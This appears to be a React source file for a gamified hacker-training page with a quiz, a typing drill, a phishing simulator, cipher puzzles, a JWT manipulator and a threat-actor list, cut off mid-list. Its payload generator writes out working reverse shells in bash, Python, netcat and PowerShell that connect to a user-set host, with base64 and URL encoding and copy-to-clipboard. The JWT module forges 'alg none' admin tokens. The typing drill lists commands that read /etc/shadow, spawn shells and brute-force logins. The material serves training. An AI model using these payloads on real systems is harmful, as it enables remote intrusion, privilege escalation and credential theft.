import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import { 
  Terminal, Shield, Cpu, Activity, Zap, Network, Lock, Unlock, Key, 
  Copy, Check, Play, RefreshCw, Send, CheckCircle2, AlertTriangle, 
  Eye, EyeOff, Trophy, Sparkles, BookOpen, Clock, Users, Code, Award,
  CheckSquare, Settings, PlayCircle, ShieldCheck, HelpCircle, UserCheck
} from 'lucide-react';
import { SectionHeader } from '../components/Shared.js';

// ============================================================================
// MODULE 1: HACKER TRIVIA QUIZ
// ============================================================================
const TRIVIA_QUESTIONS = [
  {
    q: "Which port does HTTPS default to?",
    a: ["80", "443", "8080", "22"],
    correct: 1,
    exp: "HTTPS traffic defaults to port 443, using TLS to encrypt standard HTTP payloads."
  },
  {
    q: "What vulnerability classification does SQL Injection (SQLi) fall under in the OWASP Top 10?",
    a: ["Injection", "Broken Authentication", "Cryptographic Failures", "Security Misconfiguration"],
    correct: 0,
    exp: "SQLi is a classic Injection vulnerability where untrusted user input manipulates backend database queries."
  },
  {
    q: "Which malware attack in 2017 targeted Windows machines and demanded Bitcoin via a vulnerability in SMBv1 (EternalBlue)?",
    a: ["Stuxnet", "NotPetya", "WannaCry", "Mirai"],
    correct: 2,
    exp: "WannaCry ransomware spread globally using the NSA-leaked EternalBlue exploit to encrypt system files."
  },
  {
    q: "What is the primary objective of a 'Salt' in password hashing?",
    a: ["Encrypting the database", "Preventing SQL injection attacks", "Stopping reverse pre-computed dictionary attacks (rainbow tables)", "Speeding up hash computation"],
    correct: 2,
    exp: "A unique salt added to each password ensures duplicate passwords result in unique hashes, neutralizing pre-computed dictionary (rainbow table) attacks."
  },
  {
    q: "What does SSRF stand for?",
    a: ["Secure System Routing Protocol", "Server-Side Request Forgery", "Secure Socket Routing Firewall", "Simple State Resource Format"],
    correct: 1,
    exp: "Server-Side Request Forgery occurs when an attacker forces a backend server to make unauthorized requests to internal or external hosts."
  }
];

const TriviaQuiz = () => {
  const [curr, setCurr] = useState(0);
  const [selected, setSelected] = useState(null);
  const [score, setScore] = useState(0);
  const [time, setTime] = useState(30);
  const [showRes, setShowRes] = useState(false);
  const [finished, setFinished] = useState(false);

  useEffect(() => {
    if (finished || showRes) return;
    if (time === 0) {
      handleNext();
      return;
    }
    const timer = setTimeout(() => setTime(t => t - 1), 1000);
    return () => clearTimeout(timer);
  }, [time, showRes, finished]);

  const handleSelect = (idx) => {
    if (showRes) return;
    setSelected(idx);
    setShowRes(true);
    if (idx === TRIVIA_QUESTIONS[curr].correct) {
      setScore(s => s + 1);
    }
  };

  const handleNext = () => {
    setSelected(null);
    setShowRes(false);
    setTime(30);
    if (curr + 1 < TRIVIA_QUESTIONS.length) {
      setCurr(c => c + 1);
    } else {
      setFinished(true);
    }
  };

  const resetQuiz = () => {
    setCurr(0);
    setSelected(null);
    setScore(0);
    setTime(30);
    setShowRes(false);
    setFinished(false);
  };

  const getRank = () => {
    const ratio = score / TRIVIA_QUESTIONS.length;
    if (ratio >= 0.8) return "APT CYBER OPERATIVE";
    if (ratio >= 0.6) return "RED TEAM ANALYST";
    if (ratio >= 0.4) return "SOC DRILL OFFICER";
    return "SCRIPT KIDDIE";
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Trophy className="w-4 h-4" /> Trivia Quiz Decryptor
        </h4>
        <span className="font-mono text-[0.62rem] text-slate-400">
          Question {curr + 1}/{TRIVIA_QUESTIONS.length}
        </span>
      </div>

      {finished ? (
        <div className="text-center py-6 space-y-4 font-mono">
          <Award className="w-12 h-12 text-brand-cyan mx-auto animate-bounce" />
          <h5 className="text-white text-sm font-bold uppercase">Simulation Concluded</h5>
          <div className="text-xs text-slate-400">
            Score Vector: <span className="text-brand-cyan font-bold">{score}/{TRIVIA_QUESTIONS.length}</span>
            <br />
            Rank Evaluation: <span className="text-brand-green font-bold">{getRank()}</span>
          </div>
          <button onClick={resetQuiz} className="px-4 py-2 bg-brand-cyan/20 border border-brand-cyan/40 hover:bg-brand-cyan/35 text-brand-cyan text-xs font-bold uppercase rounded cursor-pointer transition-all">
            Re-Initialize Quiz
          </button>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex justify-between items-center bg-black/40 p-3 rounded-lg border border-white/5">
            <span className="font-mono text-[0.62rem] text-slate-400">STATUS: ACTIVE INTRUSION SYSTEM</span>
            <div className="flex items-center gap-1.5 font-mono text-xs">
              <Clock className="w-3.5 h-3.5 text-brand-pink" />
              <span className={time < 10 ? "text-brand-pink animate-pulse font-bold" : "text-slate-300"}>
                {time}s
              </span>
            </div>
          </div>

          <p className="font-sans text-sm text-slate-200 leading-relaxed font-semibold">
            {TRIVIA_QUESTIONS[curr].q}
          </p>

          <div className="grid grid-cols-1 gap-2.5">
            {TRIVIA_QUESTIONS[curr].a.map((ans, idx) => {
              let btnClass = "bg-white/5 border border-white/10 text-slate-300 hover:bg-white/10 hover:border-brand-cyan/30";
              if (showRes) {
                if (idx === TRIVIA_QUESTIONS[curr].correct) {
                  btnClass = "bg-brand-green/20 border-brand-green/50 text-brand-green font-bold";
                } else if (selected === idx) {
                  btnClass = "bg-brand-pink/20 border-brand-pink/50 text-brand-pink font-bold";
                } else {
                  btnClass = "bg-white/5 border-white/5 text-slate-500 opacity-60";
                }
              }
              return (
                <button
                  key={idx}
                  onClick={() => handleSelect(idx)}
                  disabled={showRes}
                  className={`w-full py-2.5 px-4 text-left font-mono text-xs rounded transition-all flex justify-between items-center ${btnClass}`}
                >
                  <span>{idx + 1}. {ans}</span>
                  {showRes && idx === TRIVIA_QUESTIONS[curr].correct && <CheckCircle2 className="w-3.5 h-3.5 text-brand-green" />}
                </button>
              );
            })}
          </div>

          {showRes && (
            <div className="p-3.5 bg-black/60 border border-brand-cyan/20 rounded-lg space-y-2 font-mono text-[0.62rem] text-slate-300 animate-fadeIn">
              <div className="font-bold text-brand-cyan uppercase tracking-wider">// SYSTEM FOOTNOTE:</div>
              <p className="font-sans text-slate-400 leading-normal">{TRIVIA_QUESTIONS[curr].exp}</p>
              <button
                onClick={handleNext}
                className="mt-1 px-3 py-1 bg-brand-cyan/20 border border-brand-cyan/40 hover:bg-brand-cyan/30 text-brand-cyan text-[0.58rem] font-bold uppercase rounded cursor-pointer transition-all flex items-center gap-1"
              >
                Continue Pipeline <Send className="w-2.5 h-2.5" />
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

// ============================================================================
// MODULE 2: TYPING SPEED TERMINAL
// ============================================================================
const TYPING_COMMANDS = [
  "ssh root@192.168.1.105 -p 2200",
  "nmap -sS -sV -O -p 80,443 target.org",
  "curl -X POST -d '{\"payload\":\"exploit\"}' server/api",
  "cat /etc/shadow | grep admin",
  "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
  "hydra -L users.txt -P passwords.txt ftp://10.0.0.8"
];

const TypingTerminal = () => {
  const [index, setIndex] = useState(0);
  const [typed, setTyped] = useState("");
  const [status, setStatus] = useState("READY"); // READY, ACTIVE, COMPLETED
  const [startTime, setStartTime] = useState(0);
  const [records, setRecords] = useState([]); // Array of WPM

  const inputRef = useRef(null);

  const startTest = () => {
    setTyped("");
    setStartTime(Date.now());
    setStatus("ACTIVE");
    setTimeout(() => inputRef.current?.focus(), 50);
  };

  const handleInput = (e) => {
    const val = e.target.value;
    const target = TYPING_COMMANDS[index];
    setTyped(val);

    if (val === target) {
      const duration = (Date.now() - startTime) / 1000 / 60; // in minutes
      const chars = target.length;
      const wpm = Math.round((chars / 5) / duration);
      setRecords(r => [...r, wpm]);

      if (index + 1 < TYPING_COMMANDS.length) {
        setIndex(i => i + 1);
        setTyped("");
        setStartTime(Date.now());
      } else {
        setStatus("COMPLETED");
      }
    }
  };

  const resetTest = () => {
    setIndex(0);
    setTyped("");
    setRecords([]);
    setStatus("READY");
  };

  const averageWpm = records.length ? Math.round(records.reduce((a, b) => a + b, 0) / records.length) : 0;

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Terminal className="w-4 h-4 text-brand-cyan animate-pulse" /> Console Typing Injector
        </h4>
        <span className="font-mono text-[0.62rem] text-slate-400">
          Command {index + 1}/{TYPING_COMMANDS.length}
        </span>
      </div>

      <div className="bg-black/95 p-4 rounded-xl border border-white/5 font-mono text-[0.68rem] min-h-[160px] flex flex-col justify-between relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-brand-cyan/5 to-transparent pointer-events-none" />
        
        {status === "READY" && (
          <div className="flex flex-col items-center justify-center h-full my-auto space-y-3">
            <span className="text-brand-cyan tracking-wider animate-pulse">// INITIALIZE COMPILING BUFFER</span>
            <button onClick={startTest} className="px-3.5 py-1.5 bg-brand-cyan/20 border border-brand-cyan/40 hover:bg-brand-cyan/30 text-brand-cyan font-bold uppercase rounded cursor-pointer transition-all active:scale-95">
              Run Injection Drill
            </button>
          </div>
        )}

        {status === "ACTIVE" && (
          <div className="space-y-4 my-auto">
            <div>
              <div className="text-slate-500 mb-1">// INJECT STRING EXACTLY:</div>
              <div className="text-white bg-slate-900/50 p-2.5 rounded border border-white/5 text-xs select-none">
                {TYPING_COMMANDS[index].split("").map((c, i) => {
                  let color = "text-slate-400";
                  if (i < typed.length) {
                    color = typed[i] === c ? "text-brand-green" : "text-brand-pink font-bold bg-brand-pink/10";
                  }
                  return <span key={i} className={color}>{c}</span>;
                })}
              </div>
            </div>

            <div className="space-y-1">
              <span className="text-brand-cyan">agent@root:~$ </span>
              <input
                ref={inputRef}
                type="text"
                value={typed}
                onChange={handleInput}
                className="bg-transparent text-xs text-white border-b border-brand-cyan/30 outline-none w-3/4 focus:border-brand-cyan"
                placeholder="Type here..."
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
                spellCheck="false"
              />
            </div>
          </div>
        )}

        {status === "COMPLETED" && (
          <div className="flex flex-col items-center justify-center h-full my-auto space-y-3">
            <span className="text-brand-green font-bold tracking-widest">// DRILL SUCCESSFUL //</span>
            <div className="text-center text-slate-400 space-y-1 text-[0.62rem]">
              <div>Average Speed Score: <span className="text-white font-bold">{averageWpm} WPM</span></div>
              <div>Buffer Errors Cleared: <span className="text-white font-bold">100%</span></div>
            </div>
            <button onClick={resetTest} className="px-3.5 py-1.5 bg-brand-green/20 border border-brand-green/45 hover:bg-brand-green/30 text-brand-green font-bold uppercase rounded cursor-pointer transition-all">
              Cycle Memory Buffer
            </button>
          </div>
        )}

        <div className="flex justify-between items-center border-t border-white/5 pt-2 text-[0.55rem] text-slate-500">
          <span>CONSOLE PORT: ENCRYPTION ACTIVE</span>
          {records.length > 0 && <span>Running: {records[records.length - 1]} WPM</span>}
        </div>
      </div>
    </div>
  );
};

// ============================================================================
// MODULE 3: SOCIAL ENGINEERING SIMULATOR
// ============================================================================
const SOCIAL_SCENARIOS = [
  {
    title: "PayPal Resolution Center Alert",
    from: "PayPal Support <support@paypaI-security-verify.com>",
    body: "Attention: Your account profile features have been locked due to illegal billing movements. Confirm credentials inside the Resolution center immediately via the url reference below.",
    link: "http://paypaI-security-verify.com/login",
    isPhishing: true,
    reason: "The sender domain and URL substitute the lowercase 'l' with an uppercase 'I' (paypaI), which is a common homograph typosquatting vector."
  },
  {
    title: "Google Security Notification",
    from: "Google Security <no-reply@accounts.google.com>",
    body: "A new device logged in to your account. If this wasn't you, review security actions directly within your Account Settings Console.",
    link: "https://myaccount.google.com/secure-activity",
    isPhishing: false,
    reason: "The sender address uses the legitimate domain (accounts.google.com) and references the correct security route over SSL."
  },
  {
    title: "Internal IT Request Form",
    from: "HR Office <hr-dept-admin@gmail.com>",
    body: "Please update your corporate directory details on the shared organization lookup template to maintain authorization keys.",
    link: "https://docs.google.com/forms/d/e/1FAIpQLSc...",
    isPhishing: true,
    reason: "Corporate internal IT requests will never originate from consumer Gmail domains or request sensitive directory credentials via open forms."
  }
];

const SocialEngineeringSim = () => {
  const [curr, setCurr] = useState(0);
  const [feedback, setFeedback] = useState("");
  const [score, setScore] = useState(0);
  const [selected, setSelected] = useState(null);

  const handleChoice = (phish) => {
    setSelected(phish ? "PHISH" : "SAFE");
    const target = SOCIAL_SCENARIOS[curr];
    if (phish === target.isPhishing) {
      setScore(s => s + 1);
      setFeedback("✔ CORRECT AUDIT: Identity Threat Cleared. " + target.reason);
    } else {
      setFeedback("❌ LOGICAL FAIL: Vulnerability Exposed. " + target.reason);
    }
  };

  const handleNext = () => {
    setSelected(null);
    setFeedback("");
    if (curr + 1 < SOCIAL_SCENARIOS.length) {
      setCurr(c => c + 1);
    } else {
      setCurr(-1); // Finished state flag
    }
  };

  const handleReset = () => {
    setCurr(0);
    setScore(0);
    setFeedback("");
    setSelected(null);
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Shield className="w-4 h-4" /> Phishing Analysis Matrix
        </h4>
        {curr >= 0 && (
          <span className="font-mono text-[0.62rem] text-slate-400">
            Case Vector {curr + 1}/{SOCIAL_SCENARIOS.length}
          </span>
        )}
      </div>

      {curr === -1 ? (
        <div className="text-center py-6 space-y-3 font-mono">
          <UserCheck className="w-12 h-12 text-brand-cyan mx-auto animate-pulse" />
          <h5 className="text-white text-xs font-bold">// CLASSIFIED ANALYSIS FINISHED</h5>
          <div className="text-slate-400 text-xs">
            Vectors Audited Correctly: <span className="text-brand-green font-bold">{score}/{SOCIAL_SCENARIOS.length}</span>
          </div>
          <button onClick={handleReset} className="px-4 py-2 bg-brand-cyan/20 border border-brand-cyan/40 hover:bg-brand-cyan/35 text-brand-cyan text-xs font-bold uppercase rounded cursor-pointer transition-all">
            Run Diagnosis Loop
          </button>
        </div>
      ) : (
        <div className="space-y-4 font-mono text-[0.62rem]">
          <div className="bg-black/60 p-4 rounded-xl border border-white/5 space-y-2">
            <div>
              <span className="text-slate-500">FROM: </span>
              <span className="text-brand-cyan font-bold">{SOCIAL_SCENARIOS[curr].from}</span>
            </div>
            <div>
              <span className="text-slate-500">SUBJECT: </span>
              <span className="text-white uppercase font-bold">{SOCIAL_SCENARIOS[curr].title}</span>
            </div>
            <div className="border-t border-white/5 pt-2 text-slate-300 font-sans text-xs leading-normal">
              {SOCIAL_SCENARIOS[curr].body}
            </div>
            <div className="text-brand-pink hover:underline break-all pt-1 text-xs">
              {SOCIAL_SCENARIOS[curr].link}
            </div>
          </div>

          {!selected ? (
            <div className="grid grid-cols-2 gap-3">
              <button
                onClick={() => handleChoice(true)}
                className="py-2.5 bg-brand-pink/15 hover:bg-brand-pink/25 border border-brand-pink/35 text-brand-pink font-bold rounded uppercase cursor-pointer transition-all active:scale-95 text-center"
              >
                ⚠️ Phishing Exploit
              </button>
              <button
                onClick={() => handleChoice(false)}
                className="py-2.5 bg-brand-green/15 hover:bg-brand-green/25 border border-brand-green/35 text-brand-green font-bold rounded uppercase cursor-pointer transition-all active:scale-95 text-center"
              >
                🛡️ Legitimate Action
              </button>
            </div>
          ) : (
            <div className="p-3 bg-black/40 border border-white/5 rounded-lg space-y-3">
              <div className={`font-bold leading-relaxed font-sans text-xs ${feedback.startsWith("✔") ? "text-brand-green" : "text-brand-pink"}`}>
                {feedback}
              </div>
              <button
                onClick={handleNext}
                className="px-3.5 py-1.5 bg-brand-cyan/20 border border-brand-cyan/40 hover:bg-brand-cyan/30 text-brand-cyan font-bold uppercase rounded cursor-pointer transition-all"
              >
                Next Vector Case
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

// ============================================================================
// MODULE 4: CIPHER DUEL VS AI
// ============================================================================
const DUEL_DATA = [
  { cipher: "ROT13", crypt: "flag{irevsl_cebgbpby}", plain: "flag{verify_protocol}" },
  { cipher: "ROT13", crypt: "flag{pelcgb_chmmyr}", plain: "flag{crypto_puzzle}" },
  { cipher: "BASE64", crypt: "ZmxhZ3thdXRoX2J5cGFzc30=", plain: "flag{auth_bypass}" }
];

const CipherDuel = () => {
  const [index, setIndex] = useState(0);
  const [input, setInput] = useState("");
  const [aiProgress, setAiProgress] = useState(0);
  const [gameState, setGameState] = useState("READY"); // READY, PLAYING, WON, LOST
  
  useEffect(() => {
    if (gameState !== "PLAYING") return;
    const interval = setInterval(() => {
      setAiProgress(p => {
        if (p >= 100) {
          setGameState("LOST");
          clearInterval(interval);
          return 100;
        }
        return p + 4; // speed of AI duelist
      });
    }, 350);
    return () => clearInterval(interval);
  }, [gameState]);

  const handleStart = () => {
    setInput("");
    setAiProgress(0);
    setGameState("PLAYING");
  };

  const handleInput = (e) => {
    const val = e.target.value;
    setInput(val);
    if (val.trim() === DUEL_DATA[index].plain) {
      setGameState("WON");
    }
  };

  const handleNext = () => {
    if (index + 1 < DUEL_DATA.length) {
      setIndex(i => i + 1);
    } else {
      setIndex(0);
    }
    setGameState("READY");
    setAiProgress(0);
    setInput("");
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Activity className="w-4 h-4 text-brand-cyan" /> Cryptographic Duel Room
        </h4>
        <span className="font-mono text-[0.62rem] text-slate-400">
          Cipher Challenge {index + 1}/{DUEL_DATA.length}
        </span>
      </div>

      <div className="space-y-4 font-mono text-[0.62rem]">
        <div className="bg-black/60 p-4 rounded-xl border border-white/5 space-y-3">
          <div>
            <span className="text-slate-500">CIPHER METRIC: </span>
            <span className="text-brand-purple font-bold font-mono">{DUEL_DATA[index].cipher}</span>
          </div>
          <div className="text-center font-bold text-white bg-slate-900/60 py-3 rounded border border-white/5 tracking-wider select-all text-xs">
            {DUEL_DATA[index].crypt}
          </div>
        </div>

        {gameState === "READY" && (
          <button
            onClick={handleStart}
            className="w-full py-2.5 bg-brand-cyan/20 border border-brand-cyan/45 text-brand-cyan font-bold rounded uppercase cursor-pointer hover:bg-brand-cyan/30 active:scale-95 transition-all"
          >
            ⚔️ Engage AI Duelist
          </button>
        )}

        {gameState === "PLAYING" && (
          <div className="space-y-3 animate-fadeIn">
            {/* Duel Progress Bars */}
            <div className="space-y-2">
              <div>
                <div className="flex justify-between text-brand-cyan font-bold text-[0.55rem] mb-1">
                  <span>AGENT CIPHER KEY DECRYPTION</span>
                  <span>ACTIVE</span>
                </div>
                <div className="h-1.5 bg-slate-900 border border-white/5 rounded-full overflow-hidden">
                  <div className="h-full bg-brand-cyan" style={{ width: `${Math.min(100, (input.length / DUEL_DATA[index].plain.length) * 100)}%` }} />
                </div>
              </div>

              <div>
                <div className="flex justify-between text-brand-pink font-bold text-[0.55rem] mb-1">
                  <span>AI DUEL DECRYPT MODULE</span>
                  <span>{aiProgress}%</span>
                </div>
                <div className="h-1.5 bg-slate-900 border border-white/5 rounded-full overflow-hidden">
                  <div className="h-full bg-brand-pink transition-all duration-300" style={{ width: `${aiProgress}%` }} />
                </div>
              </div>
            </div>

            <input
              type="text"
              value={input}
              onChange={handleInput}
              className="w-full py-2 px-3 bg-black/40 border border-white/10 rounded font-mono text-xs text-white outline-none focus:border-brand-cyan"
              placeholder="Inject decrypted plaintext flag..."
              autoComplete="off"
            />
          </div>
        )}

        {gameState === "WON" && (
          <div className="text-center py-4 bg-brand-green/10 border border-brand-green/20 rounded-lg space-y-2">
            <span className="text-brand-green font-bold text-xs block">// DECIPHERING SUCCESSFUL: AI OUTWORKED //</span>
            <button onClick={handleNext} className="px-3.5 py-1.5 bg-brand-green/20 border border-brand-green/45 text-brand-green uppercase font-bold rounded cursor-pointer hover:bg-brand-green/30 transition-all">
              Initialize Next Target
            </button>
          </div>
        )}

        {gameState === "LOST" && (
          <div className="text-center py-4 bg-brand-pink/10 border border-brand-pink/20 rounded-lg space-y-2">
            <span className="text-brand-pink font-bold text-xs block">// DECRYPTION FAILED: AI DETECTED FIRST //</span>
            <button onClick={handleStart} className="px-3.5 py-1.5 bg-brand-pink/20 border border-brand-pink/45 text-brand-pink uppercase font-bold rounded cursor-pointer hover:bg-brand-pink/30 transition-all">
              Retry Protocol
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

// ============================================================================
// MODULE 5: JWT DECODER & MANIPULATOR
// ============================================================================
const DEFAULT_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFndW50IE5lb24iLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

const JwtDecoder = () => {
  const [token, setToken] = useState(DEFAULT_JWT);
  const [manipulate, setManipulate] = useState(false);

  const decodeJwt = (jwtStr) => {
    try {
      const parts = jwtStr.split(".");
      if (parts.length !== 3) return { err: "Broken segment payload format (Require Header.Payload.Signature)" };
      const header = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
      const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
      return { header, payload, signature: parts[2] };
    } catch (e) {
      return { err: "Decoding vector translation failed: bad format characters." };
    }
  };

  const getManipulatedToken = () => {
    try {
      const decoded = decodeJwt(token);
      if (decoded.err) return decoded.err;
      const manipulatedHeader = { ...decoded.header, alg: "none" };
      const manipulatedPayload = { ...decoded.payload, role: "admin" };
      
      const b64Header = btoa(JSON.stringify(manipulatedHeader)).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
      const b64Payload = btoa(JSON.stringify(manipulatedPayload)).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
      return `${b64Header}.${b64Payload}.`;
    } catch (e) {
      return "Generator crash";
    }
  };

  const decoded = decodeJwt(token);

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Key className="w-4 h-4 text-brand-cyan" /> JWT Signature Manipulator
        </h4>
      </div>

      <div className="space-y-4 font-mono text-[0.62rem]">
        <div className="space-y-1.5">
          <label className="text-slate-500 uppercase">// ENCRYPTED JWT PAYLOAD VECTOR:</label>
          <textarea
            value={token}
            onChange={(e) => setToken(e.target.value)}
            rows={3}
            className="w-full bg-black/40 border border-white/10 rounded p-2 text-brand-pink outline-none focus:border-brand-pink/50 text-[0.58rem]"
          />
        </div>

        {decoded.err ? (
          <div className="p-3 bg-brand-pink/15 border border-brand-pink/25 rounded text-brand-pink">
            {decoded.err}
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-3">
              <div className="bg-black/60 border border-white/5 rounded-xl p-3.5 space-y-2">
                <div className="font-bold text-brand-cyan uppercase tracking-wider">// HEADER PARTITION:</div>
                <pre className="text-white text-[0.58rem] bg-slate-950/40 p-2 rounded overflow-auto max-h-[100px]">
                  {JSON.stringify(decoded.header, null, 2)}
                </pre>
              </div>

              <div className="bg-black/60 border border-white/5 rounded-xl p-3.5 space-y-2">
                <div className="font-bold text-brand-green uppercase tracking-wider">// PAYLOAD VECTOR:</div>
                <pre className="text-white text-[0.58rem] bg-slate-950/40 p-2 rounded overflow-auto max-h-[120px]">
                  {JSON.stringify(decoded.payload, null, 2)}
                </pre>
              </div>
            </div>

            <div className="bg-black/60 border border-brand-purple/20 rounded-xl p-3.5 space-y-3 flex flex-col justify-between">
              <div className="space-y-2">
                <div className="flex items-center gap-1.5 text-brand-purple font-bold uppercase tracking-wider">
                  <AlertTriangle className="w-3.5 h-3.5" /> Manipulator Console
                </div>
                <p className="font-sans text-slate-400 leading-normal">
                  In older libraries, toggling the hashing algorithm to <code>none</code> bypasses authentication checks. Trigger alg modification simulation below.
                </p>
                <div className="flex items-center gap-2 border-t border-white/5 pt-2">
                  <input
                    type="checkbox"
                    id="bypass-alg"
                    checked={manipulate}
                    onChange={(e) => setManipulate(e.target.checked)}
                    className="accent-brand-purple cursor-pointer"
                  />
                  <label htmlFor="bypass-alg" className="cursor-pointer font-bold text-brand-purple uppercase">
                    Simulate Algorithm None Injection (Privilege Escalation)
                  </label>
                </div>
              </div>

              {manipulate && (
                <div className="space-y-2 border-t border-white/5 pt-3 animate-fadeIn">
                  <span className="text-slate-500 uppercase">// FORGED ANONYMOUS JWT:</span>
                  <div className="bg-black border border-brand-purple/40 text-brand-purple p-2 rounded break-all select-all font-bold">
                    {getManipulatedToken()}
                  </div>
                  <span className="text-[0.52rem] text-slate-400 block">// DECLARED SUB PAYLOAD: ROLE FORGED TO ADMIN</span>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

// ============================================================================
// MODULE 6: CUSTOM PAYLOAD GENERATOR
// ============================================================================
const PayloadGenerator = () => {
  const [shell, setShell] = useState("BASH");
  const [ip, setIp] = useState("10.10.14.5");
  const [port, setPort] = useState("4444");
  const [encoding, setEncoding] = useState("RAW");
  const [copied, setCopied] = useState(false);

  const generatePayload = () => {
    let raw = "";
    if (shell === "BASH") {
      raw = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    } else if (shell === "PYTHON") {
      raw = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'`;
    } else if (shell === "NETCAT") {
      raw = `nc -e /bin/sh ${ip} ${port}`;
    } else {
      raw = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});...`;
    }

    if (encoding === "BASE64") {
      if (shell === "BASH") {
        return `echo "${btoa(raw)}" | base64 -d | bash`;
      }
      return btoa(raw);
    }
    if (encoding === "URL") {
      return encodeURIComponent(raw);
    }
    return raw;
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(generatePayload());
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Zap className="w-4 h-4 text-brand-cyan" /> Payload Automation Pipeline
        </h4>
      </div>

      <div className="space-y-4 font-mono text-[0.62rem]">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <div className="space-y-1">
            <span className="text-slate-500">ENGINE:</span>
            <select
              value={shell}
              onChange={(e) => setShell(e.target.value)}
              className="w-full bg-black/40 border border-white/10 rounded p-1.5 text-white outline-none focus:border-brand-cyan"
            >
              <option value="BASH">BASH REVERSE</option>
              <option value="PYTHON">PYTHON RAW</option>
              <option value="NETCAT">NETCAT DIRECT</option>
              <option value="POWERSHELL">POWERSHELL STUB</option>
            </select>
          </div>

          <div className="space-y-1">
            <span className="text-slate-500">LHOST (IP):</span>
            <input
              type="text"
              value={ip}
              onChange={(e) => setIp(e.target.value)}
              className="w-full bg-black/40 border border-white/10 rounded p-1.5 text-white outline-none focus:border-brand-cyan"
            />
          </div>

          <div className="space-y-1">
            <span className="text-slate-500">LPORT:</span>
            <input
              type="text"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              className="w-full bg-black/40 border border-white/10 rounded p-1.5 text-white outline-none focus:border-brand-cyan"
            />
          </div>

          <div className="space-y-1">
            <span className="text-slate-500">ENCODING TYPE:</span>
            <select
              value={encoding}
              onChange={(e) => setEncoding(e.target.value)}
              className="w-full bg-black/40 border border-white/10 rounded p-1.5 text-white outline-none focus:border-brand-cyan"
            >
              <option value="RAW">RAW PLAINTEXT</option>
              <option value="BASE64">BASE64 ENCODED</option>
              <option value="URL">URL WRAPPED</option>
            </select>
          </div>
        </div>

        <div className="bg-black/60 p-4 rounded-xl border border-white/5 space-y-3 relative">
          <div className="flex justify-between items-center text-slate-500 border-b border-white/5 pb-2 mb-1">
            <span>COMPILED EXECUTABLE PAYLOAD</span>
            <button
              onClick={handleCopy}
              className="flex items-center gap-1 hover:text-white transition-colors cursor-pointer"
            >
              {copied ? <Check className="w-3.5 h-3.5 text-brand-green" /> : <Copy className="w-3.5 h-3.5" />}
              {copied ? "COPIED" : "COPY TO CLIPBOARD"}
            </button>
          </div>
          <div className="text-brand-cyan select-all break-all pr-4 text-xs min-h-[40px] font-mono leading-relaxed bg-slate-950/40 p-2 rounded">
            {generatePayload()}
          </div>
        </div>
      </div>
    </div>
  );
};

// ============================================================================
// MODULE 7: THREAT ACTOR DOSSIER DB
// ============================================================================
const ACTOR_DOSSIERS = [
  {
    name: "APT28 (Fancy Bear)",
    origin: "Russia (GRU)",
    target: "Governments, Military, Media, Energy Sectors",
    tools: "Sofacy, X-Agent, Coreshell",
    mitre: "G0007",
    desc: "Active since 2004. Known for spear-phishing campaigns and compromising routing gear. Conducted the Democratic National Committee hacks in 2016."
  },
  {
    name: "Lazarus Group (APT38)",
    origin: "North Korea",
    target: "Financial Institutions, Crypto exchanges, Entertainment",
    tools: "Hermit, Mimikatz, NukeSped",
    mitre: "G0032",
    desc: "State-sponsored cyber group. Compromised Sony Pictures in 2014, deployed WannaCry in 2017, and managed the Axie Infinity Bridge exploit in 2022."
  },
  {
    name: "Equation Group (TAO)",
    origin: "United States (NSA)",
    target: "Telecoms, Aerospace, Crytographic infrastructure",
    tools: "DoublePulsar, EternalBlue, Fanny",
    mitre: "G0020",
    desc: "Discovered by Kaspersky in 2015. Employs advanced malware modular frameworks and hardware-level storage firmware modifications."
  },
  {
    name: "Sandworm (APT44)",
    origin: "Russia",
